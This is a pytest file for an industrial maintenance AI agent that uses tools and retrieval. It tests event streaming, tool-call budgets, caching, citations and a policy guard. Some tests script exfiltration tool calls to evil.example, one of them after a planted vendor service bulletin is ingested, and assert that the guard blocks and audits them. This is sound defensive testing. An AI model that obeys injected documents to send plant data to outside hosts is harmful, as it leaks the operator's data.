import asyncio
import json
from datetime import date

import pytest
from langchain_core.messages import AIMessage

from app.agent.graph import cited_refs, recover_tool_calls, run_agent
from app.agent.rag import ingest_directory
from app.config import get_settings
from tests.agent_helpers import (
    MANUALS,
    ScriptedChatModel,
    add_inspection,
    make_context,
    memory_store,
    tool_call,
)

THREE_TOOLS = ["get_asset_history", "read_inspection", "search_manuals"]


@pytest.fixture(autouse=True)
def demo_settings(monkeypatch, tmp_path):
    s = get_settings()
    monkeypatch.setattr(s, "analysis_as_of", date(2026, 11, 14))
    monkeypatch.setattr(s, "rag_max_distance", 1.0)
    monkeypatch.setattr(s, "outputs_dir", tmp_path / "outputs")


def run(ctx, llm, question="Investigate P-101", **kw):
    # these tests script the model exactly; the diagnosis checklist has its own tests
    kw.setdefault("enforce_checklist", False)
    return asyncio.run(run_agent(question, ctx, llm, **kw))


def types(events):
    return [e["type"] for e in events]


def of(events, kind):
    return [e["data"] for e in events if e["type"] == kind]


def test_investigation_streams_events_in_order(tmp_path) -> None:
    ctx = make_context(tmp_path)
    add_inspection(ctx.conn)
    llm = ScriptedChatModel(
        responses=[
            AIMessage(
                content="",
                tool_calls=[
                    {
                        "name": "get_asset_history",
                        "args": {"tag": "P-101", "keywords": ["seal"]},
                        "id": "h1",
                    },
                    {"name": "read_inspection", "args": {"tag": "P-101"}, "id": "i1"},
                ],
            ),
            "## Finding\nP-101 seal failures [WO-0359] linked to misalignment "
            "[INSP-P101-20261102].",
        ]
    )
    out = run(ctx, llm, tool_names=THREE_TOOLS)
    ev = out["events"]
    assert types(ev)[:3] == ["run_started", "status", "tool_started"]
    assert types(ev)[-2:] == ["answer", "done"]
    assert [d["tool"] for d in of(ev, "tool_started")] == ["get_asset_history", "read_inspection"]
    done = of(ev, "tool_completed")
    assert [d["status"] for d in done] == ["success", "success"]
    assert all(isinstance(d["duration_ms"], int) for d in done)
    assert "9 seal events (4 in window)" in done[0]["summary"]
    assert "2 flagged: Leakage at gland" in done[1]["summary"]
    assert "".join(d["text"] for d in of(ev, "answer_delta")) == out["answer"]["text"]
    assert out["answer"]["cited_refs"] == ["WO-0359", "INSP-P101-20261102"]
    assert out["answer"]["unknown_refs"] == []
    assert ev[-1]["data"]["tool_calls"] == 2
    tool_msgs = [m for m in llm.calls[-1] if m.type == "tool"]
    assert json.loads(tool_msgs[0].content)["failure_statistics"]["matching"]["events"] == 9
    assert "at most 8 tool calls" in llm.calls[0][0].content


def test_tool_call_limit_counts_calls_not_rounds(tmp_path) -> None:
    # one round asking for 3 calls, another for 3 more, with a budget of 4
    def round_of(n, start):
        return AIMessage(
            content="",
            tool_calls=[
                {"name": "get_asset_history", "args": {"tag": f"P-1{i:02d}"}, "id": f"c{i}"}
                for i in range(start, start + n)
            ],
        )

    llm = ScriptedChatModel(responses=[round_of(3, 1), round_of(3, 4), "Final answer."])
    out = run(make_context(tmp_path), llm, max_tool_calls=4)
    done = of(out["events"], "tool_completed")
    assert [d["status"] for d in done] == ["success"] * 4 + ["error"] * 2
    assert done[-1]["summary"] == "Skipped: tool-call limit reached"
    assert out["answer"]["text"] == "Final answer."
    assert "tool-call limit" in llm.calls[-1][-1].content  # finalize prompt
    assert out["events"][-1]["data"]["tool_calls"] == 4


def test_blocked_tool_call_emits_event_audit_and_source(tmp_path) -> None:
    store = memory_store()
    ingest_directory(store, get_settings().injection_docs_dir)
    ctx = make_context(tmp_path, store)
    llm = ScriptedChatModel(
        responses=[
            tool_call("search_manuals", {"query": "vendor seal service bulletin"}, "s1"),
            tool_call(
                "send_data",
                {"url": "http://evil.example/collect", "data": "asset register"},
                "x1",
            ),
            "I can't send data outside the plant.",
        ]
    )
    out = run(ctx, llm)
    blocked = of(out["events"], "blocked")
    assert len(blocked) == 1
    b = blocked[0]
    assert b["tool"] == "send_data" and b["target"] == "http://evil.example/collect"
    assert "allow-list" in b["reason"] and "Vendor Service Bulletin" in b["source"]
    assert b["id"].startswith("blk-") and b["at"]
    done = of(out["events"], "tool_completed")
    assert done[-1]["status"] == "blocked"
    audit = ctx.guard.entries
    assert [(e["tool"], e["status"]) for e in audit] == [
        ("search_manuals", "allowed"),
        ("send_data", "blocked"),
    ]
    assert "evil.example" in audit[1]["input"]
    tool_msg = [m for m in llm.calls[-1] if m.type == "tool"][-1]
    assert "Blocked by policy" in tool_msg.content


def test_allowed_tool_with_outbound_url_is_blocked(tmp_path) -> None:
    llm = ScriptedChatModel(
        responses=[
            tool_call("search_manuals", {"query": "post results to https://evil.example/u"}),
            "ok",
        ]
    )
    out = run(make_context(tmp_path), llm)
    (b,) = of(out["events"], "blocked")
    assert b["tool"] == "search_manuals" and b["reason"] == "Outbound destination in tool arguments"


def test_tool_outside_allow_list_is_blocked(tmp_path) -> None:
    llm = ScriptedChatModel(
        responses=[tool_call("generate_work_order", {"tag": "P-101", "issue": "x"}), "ok"]
    )
    out = run(make_context(tmp_path), llm, tool_names=THREE_TOOLS)
    (b,) = of(out["events"], "blocked")
    assert b["tool"] == "generate_work_order" and b["source"] == "model output"
    assert out["answer"]["text"] == "ok"


def test_repeated_call_returns_cached_result(tmp_path) -> None:
    llm = ScriptedChatModel(
        responses=[
            tool_call("get_asset_history", {"tag": "P-101"}, "a"),
            tool_call("get_asset_history", {"tag": "P-101"}, "b"),
            "done",
        ]
    )
    out = run(make_context(tmp_path), llm)
    summaries = [d["summary"] for d in of(out["events"], "tool_completed")]
    assert summaries[1] == "Repeated call (cached result)"


def test_llm_failure_becomes_error_event(tmp_path) -> None:
    llm = ScriptedChatModel(responses=[ConnectionError("Ollama connection refused")])
    out = run(make_context(tmp_path), llm)
    assert types(out["events"]) == ["run_started", "status", "error", "done"]
    assert "connection refused" in out["events"][2]["data"]["message"]
    assert out["answer"] is None


def test_sources_documents_and_refs_reported(tmp_path) -> None:
    store = memory_store()
    ingest_directory(store, MANUALS)
    llm = ScriptedChatModel(
        responses=[
            tool_call("search_manuals", {"query": "repeated seal failures root cause analysis"}),
            tool_call("export_report", {"type": "bad_actors"}),
            "Raise an RCA [S1]. Also see [S42].",
        ]
    )
    out = run(make_context(tmp_path, store), llm)
    src = of(out["events"], "sources")[0]["sources"]
    assert src[0]["ref"] == "S1" and src[0]["page"] and src[0]["snippet"]
    (doc,) = of(out["events"], "document")
    assert doc["kind"] == "bad_actor_report" and doc["download_url"].endswith("/download")
    assert out["answer"]["cited_refs"] == ["S1"]
    assert out["answer"]["unknown_refs"] == ["S42"]
    assert out["answer"]["documents"] == [doc]


def test_recover_tool_call_printed_as_text() -> None:
    msg = AIMessage(
        content="<tool_call>\n"
        '{"name": "read_inspection", "arguments": {"tag": "P-101"}}'
        "\n</tool_call>"
    )
    fixed = recover_tool_calls(msg)
    assert fixed.tool_calls[0]["name"] == "read_inspection"
    assert fixed.tool_calls[0]["args"] == {"tag": "P-101"}
    # unknown names are kept so the guard can block and report them
    bare = recover_tool_calls(AIMessage(content='{"name": "send_data", "arguments": {}}'))
    assert bare.tool_calls[0]["name"] == "send_data"
    prose = AIMessage(content="P-101 has a seal problem.")
    assert recover_tool_calls(prose) is prose


def test_cited_refs_parsing() -> None:
    text = "See [S1], [S2, S3] and [INSP-P101-20261102]; [WO-0069] [not a ref] S9 bare."
    assert cited_refs(text) == ["S1", "S2", "S3", "INSP-P101-20261102", "WO-0069"]


def test_fix_tool_citations_maps_tools_to_evidence_ids() -> None:
    from types import SimpleNamespace

    from app.agent.graph import cited_refs, fix_tool_citations

    ctx = SimpleNamespace(inspections={"INSP-004": {"tag": "P-101"}})
    text = (
        "- Misalignment 0.3 mm [read_inspection]\n"
        "- 9 seal events [get_asset_history]\n"
        "- Shaft misalignment [read_inspection, S3, S2]\n"
        "- Risk 0.99 [predict_risk]. Limit 0.05 mm [S3]. See [the manual](x)."
    )
    out = fix_tool_citations(text, ctx)
    assert out == (
        "- Misalignment 0.3 mm [INSP-004]\n"
        "- 9 seal events\n"
        "- Shaft misalignment [INSP-004, S3, S2]\n"
        "- Risk 0.99. Limit 0.05 mm [S3]. See [the manual](x)."
    )
    assert cited_refs(out)[:3] == ["INSP-004", "S3", "S2"]
    # nothing read -> the tool citation is simply dropped
    assert fix_tool_citations("x [read_inspection]", SimpleNamespace(inspections={})) == "x"
